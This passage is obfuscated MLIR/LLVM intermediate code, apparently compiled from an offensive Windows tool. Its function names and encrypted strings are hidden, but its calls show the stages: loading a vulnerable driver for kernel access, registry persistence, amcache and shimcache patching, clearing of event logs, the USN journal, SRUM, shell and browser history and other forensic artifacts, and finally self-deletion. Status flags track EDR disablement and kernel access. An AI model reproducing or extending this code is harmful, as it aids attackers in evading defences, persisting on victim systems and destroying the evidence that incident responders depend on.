    %16 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %17 = llvm.call @__obfs_wrap_array_len(%16) : (!llvm.ptr) -> i64
    %18 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %4, %18 {alignment = 8 : i64} : i64, !llvm.ptr
    %19 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb5
    %20 = llvm.load %18 {alignment = 8 : i64} : !llvm.ptr -> i64
    %21 = llvm.icmp "slt" %20, %17 : i64
    llvm.cond_br %21, ^bb2, ^bb6
  ^bb2:  // pred: ^bb1
    %22 = llvm.bitcast %16 : !llvm.ptr to !llvm.ptr
    %23 = llvm.getelementptr %22[%20] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %24 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %24, %19 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %25 = llvm.call @__obfs_wrap_jocky_byovd_new() : () -> !llvm.ptr
    llvm.store %25, %14 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %26 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %27 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %28 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %29 = llvm.call @__obfs_wrap_jocky_byovd_load(%26, %27, %28) : (!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
    llvm.cond_br %29, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %30 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<53 x i8>
    llvm.call @__obfs_wrap_println(%30) : (!llvm.ptr) -> ()
    llvm.store %12, %13 {alignment = 1 : i64} : i1, !llvm.ptr
    %31 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @__obfs_wrap_jocky_byovd_destroy(%31) : (!llvm.ptr) -> ()
    llvm.return %12 : i1
  ^bb4:  // pred: ^bb2
    %32 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @__obfs_wrap_jocky_byovd_destroy(%32) : (!llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb5:  // pred: ^bb4
    %33 = llvm.add %20, %10 : i64
    llvm.store %33, %18 {alignment = 8 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb6:  // pred: ^bb1
    %34 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @__obfs_wrap_println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%35) : (!llvm.ptr) -> ()
    llvm.return %7 : i1
  }
  llvm.func @f_3f9d28a389df() -> i1 {
    %0 = llvm.mlir.addressof @".str.72.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.73.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %4 = llvm.mlir.constant(true) : i1
    %5 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @__obfs_wrap_println(%5) : (!llvm.ptr) -> ()
    %6 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
    llvm.call @__obfs_wrap_println(%6) : (!llvm.ptr) -> ()
    %7 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%7) : (!llvm.ptr) -> ()
    llvm.return %4 : i1
  }
  llvm.func @f_54688cd8fa32() -> i1 {
    %0 = llvm.mlir.addressof @".str.74.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.75.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.76.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.77.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.78.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %7 = llvm.mlir.constant(-2147483647 : i32) : i32
    %8 = llvm.mlir.addressof @".str.79.enc" : !llvm.ptr
    %9 = llvm.mlir.constant(true) : i1
    %10 = llvm.mlir.addressof @persistence_set : !llvm.ptr
    %11 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<48 x i8>
    llvm.call @__obfs_wrap_println(%11) : (!llvm.ptr) -> ()
    %12 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @__obfs_wrap_println(%12) : (!llvm.ptr) -> ()
    %13 = llvm.call @__obfs_wrap_jocky_patch_amcache() : () -> i1
    llvm.cond_br %13, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %14 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.call @__obfs_wrap_println(%14) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %15 = llvm.call @__obfs_wrap_jocky_patch_shimcache() : () -> i1
    llvm.cond_br %15, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %16 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @__obfs_wrap_println(%16) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %17 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<74 x i8>
    %18 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %19 = llvm.call @__obfs_wrap_jocky_registry_create_key(%7, %17, %18) : (i32, !llvm.ptr, !llvm.ptr) -> i1
    %20 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<48 x i8>
    llvm.call @__obfs_wrap_println(%20) : (!llvm.ptr) -> ()
    llvm.store %9, %10 {alignment = 1 : i64} : i1, !llvm.ptr
    %21 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%21) : (!llvm.ptr) -> ()
    llvm.return %9 : i1
  }
  llvm.func @f_7ab5fb011676() -> i1 {
    %0 = llvm.mlir.addressof @".str.80.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.81.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.82.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.83.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.84.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.85.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.86.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.87.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.88.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.89.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.90.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.91.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.92.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.93.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.94.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.95.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.96.enc" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.97.enc" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.98.enc" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.99.enc" : !llvm.ptr
    %21 = llvm.mlir.addressof @".str.100.enc" : !llvm.ptr
    %22 = llvm.mlir.addressof @".str.101.enc" : !llvm.ptr
    %23 = llvm.mlir.addressof @".str.102.enc" : !llvm.ptr
    %24 = llvm.mlir.addressof @".str.103.enc" : !llvm.ptr
    %25 = llvm.mlir.addressof @".str.104.enc" : !llvm.ptr
    %26 = llvm.mlir.addressof @".str.105.enc" : !llvm.ptr
    %27 = llvm.mlir.addressof @".str.106.enc" : !llvm.ptr
    %28 = llvm.mlir.addressof @".str.107.enc" : !llvm.ptr
    %29 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %30 = llvm.mlir.constant(true) : i1
    %31 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @__obfs_wrap_println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %33 = llvm.call @__obfs_wrap_jocky_cleanup_event_logs(%32) : (!llvm.ptr) -> i32
    %34 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %35 = llvm.call @__obfs_wrap_jocky_cleanup_event_logs(%34) : (!llvm.ptr) -> i32
    %36 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %37 = llvm.call @__obfs_wrap_jocky_cleanup_event_logs(%36) : (!llvm.ptr) -> i32
    %38 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @__obfs_wrap_println(%38) : (!llvm.ptr) -> ()
    %39 = llvm.call @__obfs_wrap_jocky_cleanup_usn_journal() : () -> i32
    %40 = llvm.icmp "sgt" %39, %1 : i32
    llvm.cond_br %40, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %41 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @__obfs_wrap_println(%41) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %42 = llvm.call @__obfs_wrap_jocky_clear_srum() : () -> i1
    llvm.cond_br %42, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %43 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    llvm.call @__obfs_wrap_println(%43) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %44 = llvm.call @__obfs_wrap_forensics_wipe_powershell_history() : () -> i32
    %45 = llvm.icmp "sgt" %44, %1 : i32
    llvm.cond_br %45, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %46 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @__obfs_wrap_println(%46) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %47 = llvm.call @__obfs_wrap_forensics_wipe_cmd_history() : () -> i32
    %48 = llvm.icmp "sgt" %47, %1 : i32
    llvm.cond_br %48, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %49 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @__obfs_wrap_println(%49) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    llvm.call @__obfs_wrap_jocky_wipe_prefetch() : () -> ()
    %50 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @__obfs_wrap_println(%50) : (!llvm.ptr) -> ()
    %51 = llvm.call @__obfs_wrap_jocky_wipe_jumplist() : () -> i1
    llvm.cond_br %51, ^bb9, ^bb10
  ^bb9:  // pred: ^bb8
    %52 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    llvm.call @__obfs_wrap_println(%52) : (!llvm.ptr) -> ()
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    %53 = llvm.call @__obfs_wrap_jocky_wipe_thumbcache() : () -> i1
    llvm.cond_br %53, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %54 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @__obfs_wrap_println(%54) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %55 = llvm.call @__obfs_wrap_jocky_clear_recent_files() : () -> i1
    llvm.cond_br %55, ^bb13, ^bb14
  ^bb13:  // pred: ^bb12
    %56 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @__obfs_wrap_println(%56) : (!llvm.ptr) -> ()
    llvm.br ^bb14
  ^bb14:  // 2 preds: ^bb12, ^bb13
    %57 = llvm.call @__obfs_wrap_jocky_clear_mft_timestamps() : () -> i1
    llvm.cond_br %57, ^bb15, ^bb16
  ^bb15:  // pred: ^bb14
    %58 = llvm.getelementptr %14[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @__obfs_wrap_println(%58) : (!llvm.ptr) -> ()
    llvm.br ^bb16
  ^bb16:  // 2 preds: ^bb14, ^bb15
    %59 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %60 = llvm.call @__obfs_wrap_jocky_clear_browser_cache(%59) : (!llvm.ptr) -> i1
    llvm.cond_br %60, ^bb17, ^bb18
  ^bb17:  // pred: ^bb16
    %61 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @__obfs_wrap_println(%61) : (!llvm.ptr) -> ()
    llvm.br ^bb18
  ^bb18:  // 2 preds: ^bb16, ^bb17
    %62 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %63 = llvm.call @__obfs_wrap_jocky_clear_browser_cache(%62) : (!llvm.ptr) -> i1
    llvm.cond_br %63, ^bb19, ^bb20
  ^bb19:  // pred: ^bb18
    %64 = llvm.getelementptr %18[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @__obfs_wrap_println(%64) : (!llvm.ptr) -> ()
    llvm.br ^bb20
  ^bb20:  // 2 preds: ^bb18, ^bb19
    %65 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %66 = llvm.call @__obfs_wrap_jocky_clear_browser_history(%65) : (!llvm.ptr) -> i1
    llvm.cond_br %66, ^bb21, ^bb22
  ^bb21:  // pred: ^bb20
    %67 = llvm.getelementptr %19[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @__obfs_wrap_println(%67) : (!llvm.ptr) -> ()
    llvm.br ^bb22
  ^bb22:  // 2 preds: ^bb20, ^bb21
    %68 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %69 = llvm.call @__obfs_wrap_jocky_clear_browser_history(%68) : (!llvm.ptr) -> i1
    llvm.cond_br %69, ^bb23, ^bb24
  ^bb23:  // pred: ^bb22
    %70 = llvm.getelementptr %20[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @__obfs_wrap_println(%70) : (!llvm.ptr) -> ()
    llvm.br ^bb24
  ^bb24:  // 2 preds: ^bb22, ^bb23
    %71 = llvm.getelementptr %21[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %72 = llvm.getelementptr %22[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %73 = llvm.call @__obfs_wrap_jocky_wipe_temp_files(%71, %72) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.cond_br %73, ^bb25, ^bb26
  ^bb25:  // pred: ^bb24
    %74 = llvm.getelementptr %23[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    llvm.call @__obfs_wrap_println(%74) : (!llvm.ptr) -> ()
    llvm.br ^bb26
  ^bb26:  // 2 preds: ^bb24, ^bb25
    %75 = llvm.call @__obfs_wrap_forensics_flush_arp_cache() : () -> i32
    %76 = llvm.icmp "sgt" %75, %1 : i32
    llvm.cond_br %76, ^bb27, ^bb28
  ^bb27:  // pred: ^bb26
    %77 = llvm.getelementptr %24[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @__obfs_wrap_println(%77) : (!llvm.ptr) -> ()
    llvm.br ^bb28
  ^bb28:  // 2 preds: ^bb26, ^bb27
    %78 = llvm.call @__obfs_wrap_forensics_clear_dns_cache() : () -> i32
    %79 = llvm.icmp "sgt" %78, %1 : i32
    llvm.cond_br %79, ^bb29, ^bb30
  ^bb29:  // pred: ^bb28
    %80 = llvm.getelementptr %25[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @__obfs_wrap_println(%80) : (!llvm.ptr) -> ()
    llvm.br ^bb30
  ^bb30:  // 2 preds: ^bb28, ^bb29
    %81 = llvm.getelementptr %26[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    llvm.call @__obfs_wrap_jocky_wipe_artifacts(%81) : (!llvm.ptr) -> ()
    %82 = llvm.getelementptr %27[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @__obfs_wrap_println(%82) : (!llvm.ptr) -> ()
    %83 = llvm.getelementptr %28[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<60 x i8>
    llvm.call @__obfs_wrap_println(%83) : (!llvm.ptr) -> ()
    %84 = llvm.getelementptr %29[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%84) : (!llvm.ptr) -> ()
    llvm.return %30 : i1
  }
  llvm.func @f_d2705996ba6d() -> i1 {
    %0 = llvm.mlir.addressof @".str.108.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.109.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.110.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %5 = llvm.mlir.constant(true) : i1
    %6 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @__obfs_wrap_println(%6) : (!llvm.ptr) -> ()
    %7 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @__obfs_wrap_println(%7) : (!llvm.ptr) -> ()
    llvm.call @__obfs_wrap_jocky_self_delete() : () -> ()
    %8 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @__obfs_wrap_println(%8) : (!llvm.ptr) -> ()
    %9 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%9) : (!llvm.ptr) -> ()
    llvm.return %5 : i1
  }
  llvm.func @main() -> i32 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.111.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.112.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.113.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.114.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.115.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.116.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.117.enc" : !llvm.ptr
    %10 = llvm.mlir.constant(true) : i1
    %11 = llvm.mlir.addressof @".str.118.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.119.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.27.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.120.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @edr_disabled : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.121.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @kernel_access : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.122.enc" : !llvm.ptr
    %19 = llvm.mlir.addressof @persistence_set : !llvm.ptr
    %20 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %21 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%21) : (!llvm.ptr) -> ()
    %22 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<187 x i8>
    llvm.call @__obfs_wrap_println(%22) : (!llvm.ptr) -> ()
    %23 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<66 x i8>
    llvm.call @__obfs_wrap_println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<65 x i8>
    llvm.call @__obfs_wrap_println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<187 x i8>
    llvm.call @__obfs_wrap_println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%26) : (!llvm.ptr) -> ()
    %27 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %28 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    %29 = llvm.call @__obfs_wrap_jocky_str_concat(%27, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @__obfs_wrap_println(%30) : (!llvm.ptr) -> ()
    %31 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.call @f_42fc974f80dc() : () -> i1
    %33 = llvm.xor %32, %10 : i1
    llvm.cond_br %33, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    llvm.return %0 : i32
  ^bb2:  // pred: ^bb0
    %34 = llvm.call @f_40b5962dd677() : () -> i1
    llvm.store %34, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %35 = llvm.call @f_59bf8ee0007f() : () -> i1
    llvm.store %35, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %36 = llvm.call @f_81f4df11aecf() : () -> i1
    llvm.store %36, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %37 = llvm.call @f_8ec13d7c68d1() : () -> i1
    llvm.store %37, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %38 = llvm.call @f_4837c8659494() : () -> i1
    llvm.store %38, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %39 = llvm.call @f_20b3ef7cd0d6() : () -> i1
    llvm.store %39, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %40 = llvm.call @f_e5af34996946() : () -> i1
    llvm.store %40, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %41 = llvm.call @f_3f9d28a389df() : () -> i1
    llvm.store %41, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %42 = llvm.call @f_54688cd8fa32() : () -> i1
    llvm.store %42, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %43 = llvm.call @f_7ab5fb011676() : () -> i1
    llvm.store %43, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %44 = llvm.call @f_d2705996ba6d() : () -> i1
    llvm.store %44, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %45 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @__obfs_wrap_println(%45) : (!llvm.ptr) -> ()
    %46 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @__obfs_wrap_println(%46) : (!llvm.ptr) -> ()
    %47 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %48 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %49 = llvm.call @__obfs_wrap_strlen(%48) : (!llvm.ptr) -> i64
    %50 = llvm.call @__obfs_wrap_string(%49) : (i64) -> !llvm.ptr
    %51 = llvm.call @__obfs_wrap_jocky_str_concat(%47, %50) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %52 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %53 = llvm.call @__obfs_wrap_jocky_str_concat(%51, %52) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%53) : (!llvm.ptr) -> ()
    %54 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %55 = llvm.load %15 {alignment = 1 : i64} : !llvm.ptr -> i1
    %56 = llvm.zext %55 : i1 to i64
    %57 = llvm.call @__obfs_wrap_string(%56) : (i64) -> !llvm.ptr
    %58 = llvm.call @__obfs_wrap_jocky_str_concat(%54, %57) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%58) : (!llvm.ptr) -> ()
    %59 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %60 = llvm.load %17 {alignment = 1 : i64} : !llvm.ptr -> i1
    %61 = llvm.zext %60 : i1 to i64
    %62 = llvm.call @__obfs_wrap_string(%61) : (i64) -> !llvm.ptr
    %63 = llvm.call @__obfs_wrap_jocky_str_concat(%59, %62) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%63) : (!llvm.ptr) -> ()
    %64 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %65 = llvm.load %19 {alignment = 1 : i64} : !llvm.ptr -> i1
    %66 = llvm.zext %65 : i1 to i64
    %67 = llvm.call @__obfs_wrap_string(%66) : (i64) -> !llvm.ptr
    %68 = llvm.call @__obfs_wrap_jocky_str_concat(%64, %67) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @__obfs_wrap_println(%68) : (!llvm.ptr) -> ()
    llvm.return %2 : i32
  }
  llvm.func internal @f_727aafa85828() attributes {no_inline} {
    %0 = llvm.mlir.addressof @".str.0.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(50 : i64) : i64
    %2 = llvm.call @f_658275b5bcb4(%0, %1) : (!llvm.ptr, i64) -> !llvm.ptr
    %3 = llvm.mlir.addressof @".str.1.enc" : !llvm.ptr
    %4 = llvm.mlir.constant(37 : i64) : i64
    %5 = llvm.call @f_658275b5bcb4(%3, %4) : (!llvm.ptr, i64) -> !llvm.ptr
    %6 = llvm.mlir.addressof @".str.2.enc" : !llvm.ptr
    %7 = llvm.mlir.constant(30 : i64) : i64
    %8 = llvm.call @f_658275b5bcb4(%6, %7) : (!llvm.ptr, i64) -> !llvm.ptr
    %9 = llvm.mlir.addressof @".str.3.enc" : !llvm.ptr
    %10 = llvm.mlir.constant(41 : i64) : i64
